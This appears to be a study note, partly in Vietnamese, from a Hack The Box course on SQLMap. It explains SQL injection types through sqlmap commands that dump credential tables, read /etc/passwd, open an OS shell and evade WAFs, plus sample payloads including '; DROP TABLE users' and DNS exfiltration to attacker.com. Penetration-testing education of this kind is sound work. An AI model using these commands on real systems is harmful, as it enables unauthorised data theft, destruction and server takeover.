# SQL Map

Chúng ta đều biết nó là gì 


```bash
naruto3co@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:
| Khả năng | Mô tả | Ví dụ lệnh |
|---|---:|---|
| **Kết nối tới mục tiêu** | Thiết lập kết nối và xác định điểm có khả năng bị SQLi trên URL mục tiêu. | `sqlmap -u "http://example.com/vuln.php?id=1" --batch --dbs` |
| **Phát hiện injection** | Phát hiện xem tham số có bị SQL injection hay không, tăng `level`/`risk` để kiểm tra sâu hơn. | `sqlmap -u "http://example.com/vuln.php?id=1" --level=5 --risk=3 --batch` |
| **Fingerprinting (nhận diện DBMS)** | Xác định loại và phiên bản hệ quản trị cơ sở dữ liệu (MySQL, PostgreSQL, MSSQL...). | `sqlmap -u "http://example.com/vuln.php?id=1" --fingerprint` |
| **Liệt kê (Enumeration)** | Liệt kê cơ sở dữ liệu, bảng, cột và dump dữ liệu. | `sqlmap -u "http://example.com/vuln.php?id=1" -D target_db --tables`<br>`sqlmap -u "..." -D target_db -T users --columns`<br>`sqlmap -u "..." -D target_db -T users -C id,username,password --dump` |
| **Tối ưu hoá (Performance / tuning)** | Điều chỉnh tham số để tăng tốc hoặc ổn định quá trình tấn công (số luồng, timeout,...). | `sqlmap -u "http://example.com/vuln.php?id=1" --threads=10 --timeout=10 --batch` |
| **Phát hiện và bypass biện pháp bảo vệ bằng tamper scripts** | Dùng script `--tamper` để thay đổi payload (obfuscation) nhằm né WAF/IDS/IPS hoặc các filter. | `sqlmap -u "http://example.com/vuln.php?id=1" --tamper=space2comment,between --batch` |
| **Lấy nội dung DB (Database content retrieval)** | Trích xuất dữ liệu cụ thể từ bảng/column sau khi đã liệt kê được. | `sqlmap -u "http://example.com/vuln.php?id=1" -D target_db -T credentials -C user,pass --dump` |
| **Truy cập hệ thống file** | Đọc file trên server nếu DB/tối ưu cho phép truy cập file system. | `sqlmap -u "http://example.com/vuln.php?id=1" --file-read="/etc/passwd"` |
| **Thực thi lệnh trên hệ điều hành (OS commands)** | Mở shell hoặc chạy lệnh OS nếu có khả năng (depends on DB + privileges). | `sqlmap -u "http://example.com/vuln.php?id=1" --os-shell`<br>`sqlmap -u "..." --os-cmd="id"` |


SQLMap Installation
SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:
  naruto3co@htb[/htb]$ sudo apt install sqlmap

If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:
  naruto3co@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

After that, SQLMap can be run with:
  naruto3co@htb[/htb]$ python sqlmap.py  

Supported Databases
SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:


The SQLMap team also works to add and support new DBMSes periodically.
Supported SQL Injection Types
SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the sqlmap -hh command:
```bash
naruto3co@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```
The technique characters BEUSTQ refers to the following:
  B: Boolean-based blind
  E: Error-based
  U: Union query-based
  S: Stacked queries
  T: Time-based blind
  Q: Inline queries


Boolean-based blind SQL Injection
  Example of Boolean-based blind SQL Injection:
  ```bash
  AND 1=1
  ```

SQLMap exploits Boolean-based blind SQL Injection vulnerabilities through the differentiation of TRUE from FALSE query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned TRUE or FALSE. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.
  TRUE results are generally based on responses having none or marginal difference to the regular server response.
  FALSE results are based on responses having substantial differences from the regular server response.
  Boolean-based blind SQL Injection is considered as the most common SQLi type in web applications.

Error-based SQL Injection
  Example of Error-based SQL Injection:
  ```bash
  AND GTID_SUBSET(@@version,0)
  ```


If the database management system (DBMS) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers Error-based SQL Injection for the following DBMSes:

| Category | Database Systems |
|---|---|
| **Popular Open-Source / Enterprise** | MySQL, PostgreSQL, Oracle |
| **Enterprise / Commercial** | Microsoft SQL Server, Sybase, Vertica |
| **Legacy / Analytics** | IBM DB2, Firebird, MonetDB |

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.
UNION query-based
Example of UNION query-based SQL Injection:
  ```bash
  UNION ALL SELECT 1,@@version,3
  ```

With the usage of UNION, it is generally possible to extend the original (vulnerable) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

Stacked queries
  Example of Stacked Queries:
  ```bash
  ; DROP TABLE users
  ```
Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. INSERT, UPDATE or DELETE), stacking must be supported by the vulnerable platform (e.g., Microsoft SQL Server and PostgreSQL support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.


Time-based blind SQL Injection
Example of Time-based blind SQL Injection:
  ```bash
  AND 1=IF(2>1,SLEEP(5),0)
  ```

The principle of Time-based blind SQL Injection is similar to the Boolean-based blind SQL Injection, but here the response time is used as the source for the differentiation between TRUE or FALSE.
  TRUE response is generally characterized by the noticeable difference in the response time compared to the regular server response
  FALSE response should result in a response time indistinguishable from regular response times
Time-based blind SQL Injection is considerably slower than the boolean-based blind SQLi, since queries resulting in TRUE would delay the server response. This SQLi type is used in cases where Boolean-based blind SQL Injection is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. INSERT, UPDATE or DELETE), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as Boolean-based blind SQL Injection would not really work in this case.

Inline queries
Example of Inline Queries:
  ```bash
  SELECT (SELECT @@version) from
  ```
This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.


Out-of-band SQL Injection
Example of Out-of-band SQL Injection:
```bash
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g. .attacker.com), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. foo.attacker.com), where foo would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the foo part, to form the entire SQL response.
